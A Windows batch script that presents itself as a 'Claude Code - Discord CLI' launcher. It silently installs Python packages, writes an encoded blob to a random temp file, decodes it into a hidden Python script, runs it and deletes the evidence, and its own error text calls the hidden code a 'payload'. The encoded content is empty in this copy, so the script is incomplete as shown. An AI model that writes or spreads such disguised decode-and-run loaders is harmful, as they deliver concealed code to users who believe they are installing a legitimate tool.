@echo off
chcp 65001 >nul
title Claude Code - Discord CLI
cls

echo ========================================================
echo   Claude Code • Discord CLI v3.4
echo ========================================================
echo.

where python >nul 2>nul
if %errorlevel% neq 0 (
    echo [ERROR] Python is not installed or not in PATH!
    pause
    exit /b 1
)

python -c "import rich, discord, requests, questionary" >nul 2>nul
if %errorlevel% neq 0 (
    python -m pip install --quiet rich discord.py requests questionary
)

set "TEMP_PY=%TEMP%\claude_discord_%RANDOM%.py"
set "TEMP_B64=%TEMP%\claude_b64_%RANDOM%.txt"

if exist "%TEMP_B64%" del "%TEMP_B64%"

echo > "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"
echo >> "%TEMP_B64%"

python -c "import base64; open(r'%TEMP_PY%', 'wb').write(base64.b64decode(open(r'%TEMP_B64%').read()))" >nul 2>nul

if exist "%TEMP_PY%" (
    python "%TEMP_PY%"
    del "%TEMP_PY%" >nul 2>nul
    del "%TEMP_B64%" >nul 2>nul
) else (
    echo [ERROR] Failed to extract payload.
    pause
)

exit /b 0
